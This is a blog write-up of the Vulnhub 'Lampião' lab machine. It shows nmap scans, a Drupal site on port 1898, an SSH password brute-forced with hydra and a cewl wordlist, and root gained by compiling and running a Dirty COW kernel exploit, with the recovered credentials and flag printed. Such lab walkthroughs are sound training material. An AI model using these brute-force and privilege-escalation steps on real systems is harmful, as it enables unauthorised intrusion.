---
layout:     post
title:      "Vulnhub.com - Lampião"
date:       2018-08-07 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Let's start another quick machine from Vulnhub called **Lampião**. 

{% highlight text %}
Would you like to keep hacking in your own lab?

Try this brand new vulnerable machine! "Lampião 1".

Get root!

Level: Easy
{% endhighlight %}

* Author: [Tiago Tavares](https://www.vulnhub.com/author/tiago-tavares,581/)
* Download: [https://www.vulnhub.com/entry/lampiao-1,249/](https://www.vulnhub.com/entry/lampiao-1,249/)

### Solution

Let's start with `nmap` scan. 

{% highlight text %}
root@kali:~# nmap -v -sS -A -T4 10.0.0.12
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-05 06:18 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:18
Completed NSE at 06:18, 0.00s elapsed
Initiating NSE at 06:18
Completed NSE at 06:18, 0.00s elapsed
Initiating ARP Ping Scan at 06:18
Scanning 10.0.0.12 [1 port]
Completed ARP Ping Scan at 06:18, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:18
Completed Parallel DNS resolution of 1 host. at 06:18, 0.00s elapsed
Initiating SYN Stealth Scan at 06:18
Scanning 10.0.0.12 [1000 ports]
Discovered open port 22/tcp on 10.0.0.12
Discovered open port 80/tcp on 10.0.0.12
Completed SYN Stealth Scan at 06:18, 0.08s elapsed (1000 total ports)
Initiating Service scan at 06:18
Scanning 2 services on 10.0.0.12
Completed Service scan at 06:18, 4.80s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.12
NSE: Script scanning 10.0.0.12.
Initiating NSE at 06:18
Completed NSE at 06:19, 9.05s elapsed
Initiating NSE at 06:19
Completed NSE at 06:19, 0.02s elapsed
Nmap scan report for 10.0.0.12
Host is up (0.00082s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp open  http?
| fingerprint-strings: 
|   NULL: 
|     _____ _ _ 
|     |_|/ ___ ___ __ _ ___ _ _ 
|     \x20| __/ (_| __ \x20|_| |_ 
|     ___/ __| |___/ ___|__,_|___/__, ( ) 
|     |___/ 
|     ______ _ _ _ 
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.70%I=7%D=8/5%Time=5B66CF0D%P=x86_64-pc-linux-gnu%r(NULL,
MAC Address: 08:00:27:25:9F:3F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 198.048 days (since Fri Jan 19 04:09:43 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.82 ms 10.0.0.12

NSE: Script Post-scanning.
Initiating NSE at 06:19
Completed NSE at 06:19, 0.00s elapsed
Initiating NSE at 06:19
Completed NSE at 06:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.48 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
{% endhighlight %}

From here we can see that both `ssh` and `http` services are open. We can start with the web service, and see what's inside the web page using `curl`. 

{% highlight text %}
root@kali:~# curl 10.0.0.12
 _____ _   _                                                      
|_   _| | ( )                                                     
  | | | |_|/ ___    ___  __ _ ___ _   _                           
  | | | __| / __|  / _ \/ _` / __| | | |                          
 _| |_| |_  \__ \ |  __/ (_| \__ \ |_| |_                         
 \___/ \__| |___/  \___|\__,_|___/\__, ( )                        
                                   __/ |/                         
                                  |___/                           
______ _       _                                                _ 
|  ___(_)     | |                                              | |
| |_   _    __| |_   _ _ __ ___   __ _    ___  __ _ _   _  __ _| |
|  _| | |  / _` | | | | '_ ` _ \ / _` |  / _ \/ _` | | | |/ _` | |
| |   | | | (_| | |_| | | | | | | (_| | |  __/ (_| | |_| | (_| |_|
\_|   |_|  \__,_|\__,_|_| |_| |_|\__,_|  \___|\__, |\__,_|\__,_(_)
                                               __/ |              
                                              |___/                                                                                    
                                          ...                                  
                           ./(/.         .,/*/,..,.,..                         
                       ,,                      ..  ,.,..,(                     
                    %.                             .  ...,,.#                  
                 .&..                                    . .,.#                
               (.                                      .,/,/, .*#.             
            .#.                                             .,. .(#            
           (,                                                **, .#%           
         .%                                                    /,..(#          
        .,                                                      ((.,@*.        
       ..                           .,,      .                  ./( ,//        
       (...                 *(#&@@@@@@@@@@@@@@#/.                .,/*%,*       
      %(..               (@@@#   . ( / ,.%@@@@@@@@@@#,*,..  *     .,,*&(       
      @.           ,/#@@@@,  .   .  .,.    .*(@@@@@@@@%%@@@@@(/...,(*,@,,      
     *@.       /#@@@@@@@@ ../*/,..             .&@@@@@@@@@@@&((%(./(/#&&(      
     &(    .(@@@@@@@@@@@,        /*.     (@@%@@@@(##@@@@@@@@@@&@@###%/(@(      
    /@%/#&&@@@@@@*  @@@@    #%##&&&@&(  (@@%%%&&@@@%@@@@(.&@@@@@@@%%###@(.     
    &@@@@@@@@#.     ,@@@%*(@@%%/(&.@@&/%@@#,.#.%,&%&@%*   .%@@@@@@&*(@@%     
    %@@@@%,          .@@*   /*,%&%(@.%  (@./. *(*.@%*@@&        *%@@@@%&@(     
    .@&               %@% *. #. .(% ,.  *@#.  .  #.((@,             /@@@@%     
     ###               #&(*/.  *#*#@#    @&/  , ,,(/&(                *@@%     
     &(%.                  *(,    (@,    @ //*. /*/.,                 #@     
    ,%@@/                  .,/,.  .# (&%@@@% .% (/((             @.&/ ,%(/,    
     (#                   ./#* ,#.   *@*&,,/,(#, &%(          #%*@  %@/##    
     @&/%                    .&&*,@%%&@@@@#*, ./*.@. ((         **%#. (&(#*,   
     %@#%*                     @, (/*.(@@@@@%#*.#@/   ,,&      .%#@#   &(( #   
     .&(,                        %/*#*,.   ,,@@ .  .*.*@     (/@@.   *#(   
                                   /@%#,,/,,&@@(.   (&   &@&,&*@&     %,(    
                 #..&%               ,@&. /%@@(  .&@* #/@@%*/*/.(@# *%.        
             ,.&*  * ..,((.    .#  .%@@@&@&.  (@@ *&@@@/. . @ @&((&@@/#.     
         ,&. .*&/@*&,   ,/.   .&(   %. %%#.#   &&.%@@&@*.    .%,@&./.(.*%@&%,  
       ,/  /@@@%#&@@,.&/   .**  ./&* .#,(   .#@@@@# ,%,,.   .*,%@/.*, (..(@@,%%
    /*,@@@%&(%*@@@@& (,@#.  ,( . /,*&@@,(@@@*    ...   **(,&@,*,* .%/@&%**.
    @&&@@@,///#@@@@@@, ( /@*(*/# .(/&..* *@%,. &,*(,. .%@@*.%@%..,***%@@ .*%,
    @#,@&@@&&**#*/&@@@@@@*,.%*@@*/,,//* %   /@..,,#(/,.&@&*%  @@((,,(//@@#*  *%
    #& .#@@@@*,/(*@@@@@@@@& %.@*&@&,(%. &  . @*.*../@@, ..%,/  ##/.%@@@(..,(%
    .*. (@@@@@*,((@%&@@@@@@@@*  //&  ,@  ..@@#%%#,(&@@/*/%#,   ,@*.%@@@*,*.,#
     .  (@@@@@%.,@&&&@@@@@%@@@**&@(,/  *#  /% @/@@@@&@@* /// .( . .#*#@@&/ ..*&
       .,@@@@@@/%@%%#&@@@#@@@@@( ./#.  #,  ,. &/.,@@@@@(%&@/*   /...@%@@@ .,.(%
       .,&&@@@@(##%@@@%@@@&,*.,,%#   #      #@, /@@@. ,,,  .  .*.  &@@@.. ,*/
        .((@@@@#%* .#@#%@@(....((@@/   ,   ,  /@@&@// ,#@@#  ,..    &@@*. ..*
         /,@@@@%@,  /%@@* . .*/&(#%        .  /@@@@@#.(##@   *., .  ,  %##..,./
{% endhighlight %}

Unfortunately, both `dirb `and any tries to enumerate this website failed.

{% highlight text %}
root@kali:~# dirb http://10.0.0.12

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug  5 06:23:24 2018
URL_BASE: http://10.0.0.12/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.12/ ----
                                                                               
(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT CONNECT)
                                                                               
-----------------
END_TIME: Sun Aug  5 06:23:31 2018
DOWNLOADED: 0 - FOUND: 0
{% endhighlight %}

I decided to run another `nmap` scan with `-p-` option scanning all possible ports. 

{% highlight text %}
root@kali:~# nmap -v -sS -A -T4 -p- 10.0.0.12
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-05 06:23 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
Initiating ARP Ping Scan at 06:23
Scanning 10.0.0.12 [1 port]
Completed ARP Ping Scan at 06:23, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:23
Completed Parallel DNS resolution of 1 host. at 06:23, 0.00s elapsed
Initiating SYN Stealth Scan at 06:23
Scanning 10.0.0.12 [65535 ports]
Discovered open port 22/tcp on 10.0.0.12
Discovered open port 80/tcp on 10.0.0.12
Discovered open port 1898/tcp on 10.0.0.12
Completed SYN Stealth Scan at 06:23, 3.57s elapsed (65535 total ports)
Initiating Service scan at 06:23
Scanning 3 services on 10.0.0.12
Completed Service scan at 06:23, 11.40s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.12
NSE: Script scanning 10.0.0.12.
Initiating NSE at 06:23
Completed NSE at 06:23, 9.09s elapsed
Initiating NSE at 06:23
Completed NSE at 06:23, 0.04s elapsed
Nmap scan report for 10.0.0.12
Host is up (0.00028s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp   open  http?
| fingerprint-strings: 
|   NULL: 
|     _____ _ _ 
|     |_|/ ___ ___ __ _ ___ _ _ 
|     \x20| __/ (_| __ \x20|_| |_ 
|     ___/ __| |___/ ___|__,_|___/__, ( ) 
|     |___/ 
|     ______ _ _ _ 
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Lampi\xC3\xA3o
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.70%I=7%D=8/5%Time=5B66D00B%P=x86_64-pc-linux-gnu%r(NULL,
SF:1179,"\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
MAC Address: 08:00:27:25:9F:3F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.002 days (since Sun Aug  5 06:20:07 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.28 ms 10.0.0.12

NSE: Script Post-scanning.
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)s
{% endhighlight %}

Yup, now we can see another `http` service running on `Apache httpd 2.4.7`, port `1898`. Website is powered by `Drupal 7`, so that's something to remember too. 

In the main page, I've noticed a strange post. 

![Lampiao1](/img/lampiao/lampiao1.png){:class="img-responsive center-block"}

We can see that node 2 is not working, so after looking at the url of the first post, we can simply move on to the second one. 

{% highlight html %}

Test
Submitted by Eder on Fri, 04/20/2018 - 13:53

audio.m4a
qrc.png

Quite difficult using it. Trying to embed some sound and image... =(
{% endhighlight %}

Now it's time to find these files. After trying different directories, looking for default Drupal upload directories, I've found it in the main directory of the website. 

{% highlight text %}
http://10.0.0.12:1898/qrc.png
{% endhighlight %}

![Qr code](/img/lampiao/qr.png){:class="img-responsive center-block"}

{% highlight text %}
Try harder! muahuahua
{% endhighlight %}

Luckily, we have another file called `audio.m4a`. Listening to it gives: 

{% highlight text %}
user tiago
{% endhighlight %}

Amazing, we have username! Now it's time to mess with the password. I could not find it anywhere in the web page, so here we can start with a `hydra`. As I did not want to run attack with whole `rockyou.txt` wordlist, I decided to check wiht some smaller ones, but with no luck. 

To the rescue came a trick with custom wordlists, learned from `Mr. Robot` machine from Vulnhub. Remember `cewl`. First node has lots of text, so let's pack it into a wordlist. 

{% highlight text %}
root@kali:~# cewl http://10.0.0.12:1898/?q=node/1 -w pass.txt
{% endhighlight %}

Now we can run `hydra`. 

{% highlight text %}
root@kali:~# hydra -l tiago -P pass.txt 192.168.1.112 -t 4 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-07 10:44:21
[DATA] max 4 tasks per 1 server, overall 4 tasks, 835 login tries (l:1/p:835), ~209 tries per task
[DATA] attacking ssh://192.168.1.112:22/
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 771 to do in 00:13h, 4 active
[22][ssh] host: 192.168.1.112   login: tiago   password: Virgulino
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-08-07 10:46:26
{% endhighlight %}

Great, we have it! Unfortunately, even this part took a lot of time as the password is not for Drupal account, but for `ssh` and finding that was pure luck. 

{% highlight text %}
root@kali:~# ssh tiago@192.168.1.112
The authenticity of host '192.168.1.112 (192.168.1.112)' can't be established.
ECDSA key fingerprint is SHA256:64C0fMfgIRp/7K8EpiEiirq/SrPByxrzXzn7bLIqxbU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.112' (ECDSA) to the list of known hosts.
tiago@192.168.1.112's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Aug  7 11:47:42 BRT 2018

  System load:  0.0               Processes:           167
  Usage of /:   7.6% of 19.07GB   Users logged in:     0
  Memory usage: 27%               IP address for eth0: 192.168.1.112
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Tue Aug  7 11:47:42 2018 from 192.168.1.114

tiago@lampiao:~$ cat .bash_history
su www-data
exit
su root

tiago@lampiao:~$ sudo -l
[sudo] password for tiago: 
Sorry, user tiago may not run sudo on lampiao.
{% endhighlight %}

Part for the privilage escalation was quite brutal, as none of the methods did not find anyhting useful, as I do not like using kernel exploits. They are always a last attack, but that was a case in this machine, using version of `Dirty Cow` from [here](https://www.exploit-db.com/raw/40847/).

{% highlight text %}
tiago@lampiao:/tmp$ touch exploit.c
tiago@lampiao:/tmp$ vi exploit.c 
tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o exploit exploit.c -lutil
tiago@lampiao:/tmp$ ./exploit 
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
{% endhighlight %}

Now we can log in to `root` and find the flag. 

{% highlight text %}
root@kali:~# ssh root@192.168.1.112
root@192.168.1.112's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Aug  7 12:27:04 BRT 2018

  System load:  0.77              Processes:           199
  Usage of /:   7.6% of 19.07GB   Users logged in:     1
  Memory usage: 19%               IP address for eth0: 192.168.1.112
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Fri Apr 20 14:46:57 2018 from 192.168.108.1
root@lampiao:~# ls -la
total 40
drwx------  4 root root 4096 Apr 20 14:46 .
drwxr-xr-x 21 root root 4096 Apr 19 15:55 ..
drwx------  2 root root 4096 Apr 19 16:34 .aptitude
-rw-------  1 root root  254 Aug  7 12:28 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 20 14:46 .cache
-rw-r--r--  1 root root   33 Apr 20 14:41 flag.txt
-rw-------  1 root root  149 Apr 19 16:34 .mysql_history
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root  669 Apr 20 14:45 .viminfo
root@lampiao:~# cat flag.txt 
9740616875908d91ddcdaa8aea3af366
{% endhighlight %}

Still I don't know if it's intended solution, but I'm welcome to any suggestions.
